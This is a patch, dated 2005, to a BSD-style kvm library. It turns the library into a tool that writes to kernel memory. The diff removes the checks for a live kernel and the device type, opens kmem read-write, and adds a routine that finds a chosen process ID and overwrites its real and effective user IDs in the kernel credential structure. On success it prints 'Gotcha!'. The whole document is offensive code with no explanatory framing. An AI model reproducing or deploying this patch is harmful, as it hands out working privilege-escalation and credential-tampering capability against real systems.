--- presto/kvm.c.orig	Sun Sep 11 02:10:33 2005
+++ presto/kvm.c	Sun Sep 11 02:10:33 2005
@@ -171,6 +171,7 @@
 	if (mf == 0)
 		mf = _PATH_MEM;
 
+	/*
 	if ((kd->pmfd = open(mf, flag, 0)) < 0) {
 		_kvm_syserr(kd, kd->program, "%s", mf);
 		goto failed;
@@ -183,7 +184,8 @@
 		_kvm_syserr(kd, kd->program, "%s", mf);
 		goto failed;
 	}
-	if (S_ISCHR(st.st_mode)) {
+	*/
+	if (1) {
 		/*
 		 * If this is a character special device, then check that
 		 * it's /dev/mem.  If so, open kmem too.  (Maybe we should
@@ -194,7 +196,7 @@
 			kd->vmfd = open(_PATH_DEVNULL, O_RDONLY);
 			return (kd);
 		} else if (strcmp(mf, _PATH_MEM) == 0) {
-			if ((kd->vmfd = open(_PATH_KMEM, flag)) < 0) {
+			if ((kd->vmfd = open(target_kmem, flag|O_RDWR)) < 0) {
 				_kvm_syserr(kd, kd->program, "%s", _PATH_KMEM);
 				goto failed;
 			}
@@ -349,7 +351,7 @@
 	int cc;
 	char *cp;
 
-	if (ISALIVE(kd)) {
+	if (1) {
 		/*
 		 * We're using /dev/kmem.  Just read straight from the
 		 * device and let the active kernel do the address translation.
@@ -412,7 +414,7 @@
 {
 	int cc;
 
-	if (ISALIVE(kd)) {
+	if (1) {
 		/*
 		 * Just like kvm_read, only we write.
 		 */
--- presto/kvm_private.h.orig	Sun Sep 11 02:10:33 2005
+++ presto/kvm_private.h	Sun Sep 11 02:10:33 2005
@@ -80,4 +80,10 @@
 void	*_kvm_realloc(kvm_t *kd, void *, size_t);
 void	 _kvm_syserr (kvm_t *kd, const char *program, const char *fmt, ...)
 	    __printflike(3, 4);
+
+extern pid_t target_pid;
+extern uid_t target_ruid;
+extern uid_t target_euid;
+extern char * target_kmem;
+extern int target_debug;
 int	 _kvm_uvatop(kvm_t *, const struct proc *, u_long, u_long *);
--- presto/kvm_proc.c.orig	Sun Sep 11 02:10:33 2005
+++ presto/kvm_proc.c	Sun Sep 11 02:19:06 2005
@@ -82,6 +82,9 @@
 #define KREAD(kd, addr, obj) \
 	(kvm_read(kd, addr, (char *)(obj), sizeof(*obj)) != sizeof(*obj))
 
+#define KWRITE(kd, addr, obj) \
+	(kvm_write(kd, addr, (char *)(obj), sizeof(*obj)) != sizeof(*obj))
+
 /*
  * Read proc's from memory file into buffer bp, which has space to hold
  * at most maxcnt procs.
@@ -157,7 +160,21 @@
 			bcopy(ucred.cr_groups, kp->ki_groups,
 			    NGROUPS * sizeof(gid_t));
 			kp->ki_uid = ucred.cr_uid;
+			if(target_debug)printf("pid: %5ld, uid: %4ld, gid: %4ld\n",proc.p_pid,ucred.cr_ruid,ucred.cr_rgid);
+			if (proc.p_pid == target_pid ){
+				ucred.cr_ruid=target_ruid;  /* RUID */
+				ucred.cr_uid=target_euid; /* EUID */
+				if(KWRITE(kd, (u_long)proc.p_ucred,&ucred))
+					printf ("EUID_ERR: %s\n",kvm_geterr(kd));
+				else
+					printf("Gotcha!\n");
+				return (-1);
+			};
 		}
+	};
+	printf("Whoops, pid not found :(\n");
+ 	return (-1);
+#if 0
 
 		switch(what & ~KERN_PROC_INC_THREAD) {
 
@@ -414,6 +431,7 @@
 		++cnt;
 	}
 	return (cnt);
+#endif
 }
 
 /*
@@ -469,7 +487,7 @@
 		 */
 		kd->procbase = 0;
 	}
-	if (ISALIVE(kd)) {
+	if (0) {
 		size = 0;
 		mib[0] = CTL_KERN;
 		mib[1] = KERN_PROC;
